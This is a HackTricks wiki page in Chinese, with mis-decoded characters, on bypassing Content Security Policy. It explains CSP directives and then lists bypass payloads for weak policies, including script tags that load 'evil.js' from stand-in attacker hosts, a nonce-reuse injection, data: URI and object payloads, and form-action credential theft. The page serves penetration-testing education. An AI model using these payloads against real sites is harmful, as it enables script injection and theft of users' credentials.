<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Content Security Policy (CSP) Bypass</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="å†…å®¹å®‰å…¨ç­–ç•¥-csp-ç»•è¿‡"><a class="header" href="#å†…å®¹å®‰å…¨ç­–ç•¥-csp-ç»•è¿‡">å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) ç»•è¿‡</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>åŠ å…¥ <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼</p>
<p><strong>é»‘å®¢è§è§£</strong><br />
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹</p>
<p><strong>å®æ—¶é»‘å®¢æ–°é—»</strong><br />
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ</p>
<p><strong>æœ€æ–°å…¬å‘Š</strong><br />
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘è®¡åˆ’å’Œé‡è¦å¹³å°æ›´æ–°</p>
<p><strong>ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬çš„</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>ï¼Œä¸é¡¶å°–é»‘å®¢å¼€å§‹åˆä½œå§ï¼</p>
<h2 id="ä»€ä¹ˆæ˜¯-csp"><a class="header" href="#ä»€ä¹ˆæ˜¯-csp">ä»€ä¹ˆæ˜¯ CSP</a></h2>
<p>å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) è¢«è®¤ä¸ºæ˜¯ä¸€ç§æµè§ˆå™¨æŠ€æœ¯ï¼Œä¸»è¦æ—¨åœ¨ <strong>é˜²å¾¡è¯¸å¦‚è·¨ç«™è„šæœ¬ (XSS) çš„æ”»å‡»</strong>ã€‚å®ƒé€šè¿‡å®šä¹‰å’Œè¯¦ç»†è¯´æ˜æµè§ˆå™¨å¯ä»¥å®‰å…¨åŠ è½½èµ„æºçš„è·¯å¾„å’Œæ¥æºæ¥å‘æŒ¥ä½œç”¨ã€‚è¿™äº›èµ„æºåŒ…æ‹¬å›¾åƒã€æ¡†æ¶å’Œ JavaScript ç­‰å¤šç§å…ƒç´ ã€‚ä¾‹å¦‚ï¼Œç­–ç•¥å¯èƒ½å…è®¸ä»åŒä¸€åŸŸ (self) åŠ è½½å’Œæ‰§è¡Œèµ„æºï¼ŒåŒ…æ‹¬å†…è”èµ„æºä»¥åŠé€šè¿‡ <code>eval</code>ã€<code>setTimeout</code> æˆ– <code>setInterval</code> ç­‰å‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸²ä»£ç ã€‚</p>
<p>CSP çš„å®æ–½é€šè¿‡ <strong>å“åº”å¤´</strong> æˆ–é€šè¿‡å°† <strong>meta å…ƒç´ åµŒå…¥ HTML é¡µé¢</strong> æ¥è¿›è¡Œã€‚éµå¾ªæ­¤æ”¿ç­–åï¼Œæµè§ˆå™¨ä¼šä¸»åŠ¨æ‰§è¡Œè¿™äº›è§„å®šï¼Œå¹¶ç«‹å³é˜»æ­¢ä»»ä½•æ£€æµ‹åˆ°çš„è¿è§„è¡Œä¸ºã€‚</p>
<ul>
<li>é€šè¿‡å“åº”å¤´å®æ–½ï¼š</li>
</ul>
<pre><code>Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
</code></pre>
<ul>
<li>é€šè¿‡ meta æ ‡ç­¾å®ç°ï¼š</li>
</ul>
<pre><code class="language-xml">&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"&gt;
</code></pre>
<h3 id="headers"><a class="header" href="#headers">Headers</a></h3>
<p>CSP å¯ä»¥é€šè¿‡ä»¥ä¸‹å¤´éƒ¨è¿›è¡Œå¼ºåˆ¶æ‰§è¡Œæˆ–ç›‘æ§ï¼š</p>
<ul>
<li><code>Content-Security-Policy</code>: å¼ºåˆ¶æ‰§è¡Œ CSPï¼›æµè§ˆå™¨é˜»æ­¢ä»»ä½•è¿è§„è¡Œä¸ºã€‚</li>
<li><code>Content-Security-Policy-Report-Only</code>: ç”¨äºç›‘æ§ï¼›æŠ¥å‘Šè¿è§„è¡Œä¸ºè€Œä¸é˜»æ­¢å®ƒä»¬ã€‚éå¸¸é€‚åˆåœ¨é¢„ç”Ÿäº§ç¯å¢ƒä¸­è¿›è¡Œæµ‹è¯•ã€‚</li>
</ul>
<h3 id="defining-resources"><a class="header" href="#defining-resources">Defining Resources</a></h3>
<p>CSP é™åˆ¶åŠ è½½ä¸»åŠ¨å’Œè¢«åŠ¨å†…å®¹çš„æ¥æºï¼Œæ§åˆ¶è¯¸å¦‚å†…è” JavaScript æ‰§è¡Œå’Œä½¿ç”¨ <code>eval()</code> ç­‰æ–¹é¢ã€‚ä¸€ä¸ªç¤ºä¾‹ç­–ç•¥æ˜¯ï¼š</p>
<pre><code class="language-bash">default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
</code></pre>
<h3 id="æŒ‡ä»¤"><a class="header" href="#æŒ‡ä»¤">æŒ‡ä»¤</a></h3>
<ul>
<li><strong>script-src</strong>: å…è®¸ç‰¹å®šæ¥æºçš„JavaScriptï¼ŒåŒ…æ‹¬URLã€å†…è”è„šæœ¬å’Œç”±äº‹ä»¶å¤„ç†ç¨‹åºæˆ–XSLTæ ·å¼è¡¨è§¦å‘çš„è„šæœ¬ã€‚</li>
<li><strong>default-src</strong>: è®¾ç½®åœ¨ç¼ºå°‘ç‰¹å®šè·å–æŒ‡ä»¤æ—¶è·å–èµ„æºçš„é»˜è®¤ç­–ç•¥ã€‚</li>
<li><strong>child-src</strong>: æŒ‡å®šå…è®¸çš„Webå·¥ä½œè€…å’ŒåµŒå…¥æ¡†æ¶å†…å®¹çš„èµ„æºã€‚</li>
<li><strong>connect-src</strong>: é™åˆ¶å¯ä»¥ä½¿ç”¨fetchã€WebSocketã€XMLHttpRequestç­‰æ¥å£åŠ è½½çš„URLã€‚</li>
<li><strong>frame-src</strong>: é™åˆ¶æ¡†æ¶çš„URLã€‚</li>
<li><strong>frame-ancestors</strong>: æŒ‡å®šå¯ä»¥åµŒå…¥å½“å‰é¡µé¢çš„æ¥æºï¼Œé€‚ç”¨äº<code>&lt;frame&gt;</code>ã€<code>&lt;iframe&gt;</code>ã€<code>&lt;object&gt;</code>ã€<code>&lt;embed&gt;</code>å’Œ<code>&lt;applet&gt;</code>ç­‰å…ƒç´ ã€‚</li>
<li><strong>img-src</strong>: å®šä¹‰å…è®¸çš„å›¾åƒæ¥æºã€‚</li>
<li><strong>font-src</strong>: æŒ‡å®šä½¿ç”¨<code>@font-face</code>åŠ è½½çš„å­—ä½“çš„æœ‰æ•ˆæ¥æºã€‚</li>
<li><strong>manifest-src</strong>: å®šä¹‰åº”ç”¨ç¨‹åºæ¸…å•æ–‡ä»¶çš„å…è®¸æ¥æºã€‚</li>
<li><strong>media-src</strong>: å®šä¹‰åŠ è½½åª’ä½“å¯¹è±¡çš„å…è®¸æ¥æºã€‚</li>
<li><strong>object-src</strong>: å®šä¹‰<code>&lt;object&gt;</code>ã€<code>&lt;embed&gt;</code>å’Œ<code>&lt;applet&gt;</code>å…ƒç´ çš„å…è®¸æ¥æºã€‚</li>
<li><strong>base-uri</strong>: æŒ‡å®šä½¿ç”¨<code>&lt;base&gt;</code>å…ƒç´ åŠ è½½çš„å…è®¸URLã€‚</li>
<li><strong>form-action</strong>: åˆ—å‡ºè¡¨å•æäº¤çš„æœ‰æ•ˆç«¯ç‚¹ã€‚</li>
<li><strong>plugin-types</strong>: é™åˆ¶é¡µé¢å¯ä»¥è°ƒç”¨çš„mimeç±»å‹ã€‚</li>
<li><strong>upgrade-insecure-requests</strong>: æŒ‡ç¤ºæµè§ˆå™¨å°†HTTP URLé‡å†™ä¸ºHTTPSã€‚</li>
<li><strong>sandbox</strong>: åº”ç”¨ç±»ä¼¼äº<code>&lt;iframe&gt;</code>çš„sandboxå±æ€§çš„é™åˆ¶ã€‚</li>
<li><strong>report-to</strong>: æŒ‡å®šå¦‚æœè¿åæ”¿ç­–å°†å‘é€æŠ¥å‘Šçš„ç»„ã€‚</li>
<li><strong>worker-src</strong>: æŒ‡å®šWorkerã€SharedWorkeræˆ–ServiceWorkerè„šæœ¬çš„æœ‰æ•ˆæ¥æºã€‚</li>
<li><strong>prefetch-src</strong>: æŒ‡å®šå°†è¢«è·å–æˆ–é¢„è·å–çš„èµ„æºçš„æœ‰æ•ˆæ¥æºã€‚</li>
<li><strong>navigate-to</strong>: é™åˆ¶æ–‡æ¡£å¯ä»¥é€šè¿‡ä»»ä½•æ–¹å¼å¯¼èˆªçš„URLï¼ˆaã€formã€window.locationã€window.openç­‰ï¼‰ã€‚</li>
</ul>
<h3 id="æ¥æº"><a class="header" href="#æ¥æº">æ¥æº</a></h3>
<ul>
<li><code>*</code>: å…è®¸æ‰€æœ‰URLï¼Œé™¤äº†é‚£äº›å…·æœ‰<code>data:</code>ã€<code>blob:</code>ã€<code>filesystem:</code>æ–¹æ¡ˆçš„URLã€‚</li>
<li><code>'self'</code>: å…è®¸ä»åŒä¸€åŸŸåŠ è½½ã€‚</li>
<li><code>'data'</code>: å…è®¸é€šè¿‡æ•°æ®æ–¹æ¡ˆåŠ è½½èµ„æºï¼ˆä¾‹å¦‚ï¼ŒBase64ç¼–ç çš„å›¾åƒï¼‰ã€‚</li>
<li><code>'none'</code>: é˜»æ­¢ä»ä»»ä½•æ¥æºåŠ è½½ã€‚</li>
<li><code>'unsafe-eval'</code>: å…è®¸ä½¿ç”¨<code>eval()</code>å’Œç±»ä¼¼æ–¹æ³•ï¼Œå‡ºäºå®‰å…¨åŸå› ä¸æ¨èä½¿ç”¨ã€‚</li>
<li><code>'unsafe-hashes'</code>: å¯ç”¨ç‰¹å®šçš„å†…è”äº‹ä»¶å¤„ç†ç¨‹åºã€‚</li>
<li><code>'unsafe-inline'</code>: å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œå¦‚å†…è”<code>&lt;script&gt;</code>æˆ–<code>&lt;style&gt;</code>ï¼Œå‡ºäºå®‰å…¨åŸå› ä¸æ¨èä½¿ç”¨ã€‚</li>
<li><code>'nonce'</code>: ä½¿ç”¨åŠ å¯†nonceï¼ˆä¸€æ¬¡æ€§ä½¿ç”¨çš„æ•°å­—ï¼‰å¯¹ç‰¹å®šå†…è”è„šæœ¬çš„ç™½åå•ã€‚</li>
<li>å¦‚æœæ‚¨æœ‰JSé™åˆ¶æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡<code>doc.defaultView.top.document.querySelector("[nonce]")</code>åœ¨é¡µé¢å†…è·å–ä½¿ç”¨çš„nonceï¼Œç„¶åé‡ç”¨å®ƒåŠ è½½æ¶æ„è„šæœ¬ï¼ˆå¦‚æœä½¿ç”¨äº†strict-dynamicï¼Œä»»ä½•å…è®¸çš„æ¥æºéƒ½å¯ä»¥åŠ è½½æ–°æ¥æºï¼Œå› æ­¤è¿™ä¸æ˜¯å¿…éœ€çš„ï¼‰ï¼Œå¦‚ï¼š</li>
</ul>
<details>
<summary>é‡ç”¨nonceåŠ è½½è„šæœ¬</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>
<ul>
<li><code>'sha256-&lt;hash&gt;'</code>ï¼šå…è®¸ç‰¹å®š sha256 å“ˆå¸Œçš„è„šæœ¬ã€‚</li>
<li><code>'strict-dynamic'</code>ï¼šå¦‚æœé€šè¿‡ nonce æˆ–å“ˆå¸Œè¢«åˆ—å…¥ç™½åå•ï¼Œåˆ™å…è®¸ä»ä»»ä½•æ¥æºåŠ è½½è„šæœ¬ã€‚</li>
<li><code>'host'</code>ï¼šæŒ‡å®šç‰¹å®šä¸»æœºï¼Œä¾‹å¦‚ <code>example.com</code>ã€‚</li>
<li><code>https:</code>ï¼šé™åˆ¶ URL ä»…ä½¿ç”¨ HTTPSã€‚</li>
<li><code>blob:</code>ï¼šå…è®¸ä» Blob URL åŠ è½½èµ„æºï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡ JavaScript åˆ›å»ºçš„ Blob URLï¼‰ã€‚</li>
<li><code>filesystem:</code>ï¼šå…è®¸ä»æ–‡ä»¶ç³»ç»ŸåŠ è½½èµ„æºã€‚</li>
<li><code>'report-sample'</code>ï¼šåœ¨è¿è§„æŠ¥å‘Šä¸­åŒ…å«è¿è§„ä»£ç çš„ç¤ºä¾‹ï¼ˆå¯¹è°ƒè¯•æœ‰ç”¨ï¼‰ã€‚</li>
<li><code>'strict-origin'</code>ï¼šç±»ä¼¼äº 'self'ï¼Œä½†ç¡®ä¿æºçš„åè®®å®‰å…¨çº§åˆ«ä¸æ–‡æ¡£åŒ¹é…ï¼ˆåªæœ‰å®‰å…¨æºå¯ä»¥ä»å®‰å…¨æºåŠ è½½èµ„æºï¼‰ã€‚</li>
<li><code>'strict-origin-when-cross-origin'</code>ï¼šåœ¨è¿›è¡ŒåŒæºè¯·æ±‚æ—¶å‘é€å®Œæ•´ URLï¼Œä½†åœ¨è·¨æºè¯·æ±‚æ—¶ä»…å‘é€æºã€‚</li>
<li><code>'unsafe-allow-redirects'</code>ï¼šå…è®¸åŠ è½½ä¼šç«‹å³é‡å®šå‘åˆ°å¦ä¸€ä¸ªèµ„æºçš„èµ„æºã€‚ä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºè¿™ä¼šå‰Šå¼±å®‰å…¨æ€§ã€‚</li>
</ul>
<h2 id="ä¸å®‰å…¨çš„-csp-è§„åˆ™"><a class="header" href="#ä¸å®‰å…¨çš„-csp-è§„åˆ™">ä¸å®‰å…¨çš„ CSP è§„åˆ™</a></h2>
<h3 id="unsafe-inline"><a class="header" href="#unsafe-inline">'unsafe-inline'</a></h3>
<pre><code class="language-yaml">Content-Security-Policy: script-src https://google.com 'unsafe-inline';
</code></pre>
<p>å·¥ä½œæœ‰æ•ˆè½½è·: <code>"/&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
<h4 id="self--unsafe-inline-é€šè¿‡-iframes"><a class="header" href="#self--unsafe-inline-é€šè¿‡-iframes">self + 'unsafe-inline' é€šè¿‡ Iframes</a></h4>
<p>{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
<a href="csp-bypass-self-+-unsafe-inline-with-iframes.html">csp-bypass-self-+-unsafe-inline-with-iframes.md</a>
{% endcontent-ref %}</p>
<h3 id="unsafe-eval"><a class="header" href="#unsafe-eval">'unsafe-eval'</a></h3>
<p>{% hint style="danger" %}
è¿™ä¸èµ·ä½œç”¨ï¼Œæ›´å¤šä¿¡æ¯è¯· <a href="https://github.com/HackTricks-wiki/hacktricks/issues/653"><strong>æŸ¥çœ‹æ­¤å¤„</strong></a>ã€‚
{% endhint %}</p>
<pre><code class="language-yaml">Content-Security-Policy: script-src https://google.com 'unsafe-eval';
</code></pre>
<p>å·¥ä½œæœ‰æ•ˆè½½è·ï¼š</p>
<pre><code class="language-html">&lt;script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="&gt;&lt;/script&gt;
</code></pre>
<h3 id="strict-dynamic"><a class="header" href="#strict-dynamic">strict-dynamic</a></h3>
<p>å¦‚æœä½ èƒ½ä»¥æŸç§æ–¹å¼ä½¿ä¸€ä¸ª<strong>å…è®¸çš„ JS ä»£ç åˆ›å»ºä¸€ä¸ªæ–°çš„ script æ ‡ç­¾</strong>åœ¨ DOM ä¸­ï¼Œå¹¶ä¸”å› ä¸ºæ˜¯å…è®¸çš„è„šæœ¬åœ¨åˆ›å»ºå®ƒï¼Œ<strong>æ–°çš„ script æ ‡ç­¾å°†è¢«å…è®¸æ‰§è¡Œ</strong>ã€‚</p>
<h3 id="wildcard-"><a class="header" href="#wildcard-">Wildcard (*)</a></h3>
<pre><code class="language-yaml">Content-Security-Policy: script-src 'self' https://google.com https: data *;
</code></pre>
<p>å·¥ä½œæœ‰æ•ˆè½½è·ï¼š</p>
<pre><code class="language-markup">"/&gt;'&gt;&lt;script src=https://attacker-website.com/evil.js&gt;&lt;/script&gt;
"/&gt;'&gt;&lt;script src=data:text/javascript,alert(1337)&gt;&lt;/script&gt;
</code></pre>
<h3 id="ç¼ºå°‘-object-src-å’Œ-default-src"><a class="header" href="#ç¼ºå°‘-object-src-å’Œ-default-src">ç¼ºå°‘ object-src å’Œ default-src</a></h3>
<p>{% hint style="danger" %}
<strong>çœ‹èµ·æ¥è¿™ä¸å†æœ‰æ•ˆ</strong>
{% endhint %}</p>
<pre><code class="language-yaml">Content-Security-Policy: script-src 'self' ;
</code></pre>
<p>æœ‰æ•ˆçš„æœ‰æ•ˆè½½è·ï¼š</p>
<pre><code class="language-markup">&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/object&gt;
"&gt;'&gt;&lt;object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'&gt;
&lt;param name="AllowScriptAccess" value="always"&gt;&lt;/object&gt;
</code></pre>
<h3 id="æ–‡ä»¶ä¸Šä¼ --self"><a class="header" href="#æ–‡ä»¶ä¸Šä¼ --self">æ–‡ä»¶ä¸Šä¼  + 'self'</a></h3>
<pre><code class="language-yaml">Content-Security-Policy: script-src 'self';  object-src 'none' ;
</code></pre>
<p>å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ ä¸€ä¸ª JS æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥ç»•è¿‡è¿™ä¸ª CSPï¼š</p>
<p>å·¥ä½œæœ‰æ•ˆè½½è·ï¼š</p>
<pre><code class="language-markup">"/&gt;'&gt;&lt;script src="/uploads/picture.png.js"&gt;&lt;/script&gt;
</code></pre>
<p>ç„¶è€Œï¼ŒæœåŠ¡å™¨<strong>æ­£åœ¨éªŒè¯ä¸Šä¼ çš„æ–‡ä»¶</strong>ï¼Œå¹¶ä¸”åªå…è®¸æ‚¨<strong>ä¸Šä¼ ç‰¹å®šç±»å‹çš„æ–‡ä»¶</strong>ã€‚</p>
<p>æ­¤å¤–ï¼Œå³ä½¿æ‚¨èƒ½å¤Ÿä½¿ç”¨æœåŠ¡å™¨æ¥å—çš„æ‰©å±•åï¼ˆå¦‚ï¼š<em>script.png</em>ï¼‰åœ¨æ–‡ä»¶ä¸­ä¸Šä¼ <strong>JSä»£ç </strong>ï¼Œè¿™ä¹Ÿä¸å¤Ÿï¼Œå› ä¸ºä¸€äº›æœåŠ¡å™¨å¦‚apacheæœåŠ¡å™¨<strong>æ ¹æ®æ‰©å±•åé€‰æ‹©æ–‡ä»¶çš„MIMEç±»å‹</strong>ï¼Œè€ŒåƒChromeè¿™æ ·çš„æµè§ˆå™¨å°†<strong>æ‹’ç»æ‰§è¡Œåº”è¯¥æ˜¯å›¾åƒçš„å†…å®¹ä¸­çš„Javascript</strong>ä»£ç ã€‚â€œå¸Œæœ›â€æœ‰é”™è¯¯ã€‚ä¾‹å¦‚ï¼Œä»ä¸€ä¸ªCTFä¸­æˆ‘äº†è§£åˆ°<strong>Apacheä¸çŸ¥é“</strong>_<strong>.wave</strong>_æ‰©å±•åï¼Œå› æ­¤å®ƒä¸ä¼šä»¥**MIMEç±»å‹å¦‚audio/***æä¾›å®ƒã€‚</p>
<p>ä»è¿™é‡Œå¼€å§‹ï¼Œå¦‚æœæ‚¨å‘ç°XSSå’Œæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”æ‚¨è®¾æ³•æ‰¾åˆ°ä¸€ä¸ª<strong>è¢«è¯¯è§£çš„æ‰©å±•å</strong>ï¼Œæ‚¨å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªå…·æœ‰è¯¥æ‰©å±•åå’Œè„šæœ¬å†…å®¹çš„æ–‡ä»¶ã€‚æˆ–è€…ï¼Œå¦‚æœæœåŠ¡å™¨æ­£åœ¨æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„æ­£ç¡®æ ¼å¼ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªå¤šé‡æ ¼å¼æ–‡ä»¶ï¼ˆ<a href="https://github.com/Polydet/polyglot-database">ä¸€äº›å¤šé‡æ ¼å¼ç¤ºä¾‹åœ¨è¿™é‡Œ</a>ï¼‰ã€‚</p>
<h3 id="form-action"><a class="header" href="#form-action">Form-action</a></h3>
<p>å¦‚æœæ— æ³•æ³¨å…¥JSï¼Œæ‚¨ä»ç„¶å¯ä»¥å°è¯•é€šè¿‡<strong>æ³¨å…¥è¡¨å•æ“ä½œ</strong>æ¥æå–ä¾‹å¦‚å‡­æ®ï¼ˆå¹¶å¯èƒ½æœŸæœ›å¯†ç ç®¡ç†å™¨è‡ªåŠ¨å¡«å……å¯†ç ï¼‰ã€‚æ‚¨å¯ä»¥åœ¨<a href="https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp"><strong>æ­¤æŠ¥å‘Šä¸­æ‰¾åˆ°ä¸€ä¸ªç¤ºä¾‹</strong></a>ã€‚å¦å¤–ï¼Œè¯·æ³¨æ„<code>default-src</code>ä¸æ¶µç›–è¡¨å•æ“ä½œã€‚</p>
<h3 id="ç¬¬ä¸‰æ–¹ç«¯ç‚¹--unsafe-eval"><a class="header" href="#ç¬¬ä¸‰æ–¹ç«¯ç‚¹--unsafe-eval">ç¬¬ä¸‰æ–¹ç«¯ç‚¹ + ('unsafe-eval')</a></h3>
<p>{% hint style="warning" %}
å¯¹äºä»¥ä¸‹æŸäº›æœ‰æ•ˆè´Ÿè½½**<code>unsafe-eval</code>ç”šè‡³ä¸éœ€è¦**ã€‚
{% endhint %}</p>
<pre><code class="language-yaml">Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
</code></pre>
<p>åŠ è½½ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ Angular ç‰ˆæœ¬å¹¶æ‰§è¡Œä»»æ„ JSï¼š</p>
